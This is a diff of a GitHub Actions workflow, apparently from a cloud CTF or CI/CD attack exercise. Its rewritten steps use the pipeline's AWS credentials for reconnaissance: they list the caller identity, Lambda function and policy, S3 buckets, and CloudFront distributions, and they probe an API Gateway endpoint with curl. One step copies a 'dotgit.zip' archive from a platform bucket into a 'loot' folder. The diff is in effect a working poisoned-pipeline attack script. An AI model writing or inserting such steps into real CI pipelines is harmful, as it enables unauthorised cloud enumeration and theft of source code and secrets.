@@ -22,70 +22,46 @@ jobs:
 
       - name: AWS identity
         run: |
-          echo "===== IDENTITY ====="
           aws sts get-caller-identity
 
-      - name: Lambda information
+      - name: Lambda info
         run: |
           echo "===== LAMBDA CONFIG ====="
-
           aws lambda get-function-configuration \
             --function-name nslookupv2
 
           echo "===== LAMBDA POLICY ====="
-
           aws lambda get-policy \
-            --function-name nslookupv2 || true
+            --function-name nslookupv2
 
-      - name: Lambda tags
-        run: |
-          echo "===== LAMBDA TAGS ====="
-
-          aws lambda list-tags \
-          --resource arn:aws:lambda:us-east-1:009661764077:function:nslookupv2 || true
-
-      - name: S3 information
+      - name: S3 enumeration
         run: |
           echo "===== BUCKETS ====="
-
           aws s3 ls
 
-          for bucket in $(aws s3 ls | awk '{print $3}')
-          do
-            echo "===== BUCKET POLICY $bucket ====="
-            aws s3api get-bucket-policy \
-              --bucket $bucket || true
+          echo "===== PLATFORM BUCKET ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/
 
-            echo "===== BUCKET ACL $bucket ====="
-            aws s3api get-bucket-acl \
-              --bucket $bucket || true
-          done
+          echo "===== SITE BUCKET ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ || true
 
-      - name: CloudWatch logs
+      - name: Download dotgit
         run: |
-          echo "===== LOG GROUPS ====="
+          mkdir -p loot
+          aws s3 cp \
+            s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
+            loot/dotgit.zip
 
-          aws logs describe-log-groups || true
+          unzip -l loot/dotgit.zip
 
-          echo "===== LAMBDA LOGS ====="
-
-          aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 || true
-
-      - name: IAM role information
+      - name: CloudFront discovery
         run: |
-          echo "===== CICD ROLE ====="
+          echo "===== CLOUDFRONT ====="
+          aws cloudfront list-distributions || true
 
-          aws iam get-role \
-            --role-name cicdRole || true
-
-      - name: API Gateway attempts
+      - name: Try API Gateway invoke
         run: |
-          echo "===== API GATEWAY ====="
+          echo "===== TEST API ====="
 
-          aws apigateway get-rest-apis || true
-
-          echo "===== API STAGES ====="
-
-          aws apigateway get-stages \
-            --rest-api-id 3q931syi7b || true
+          curl -i \
+          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/
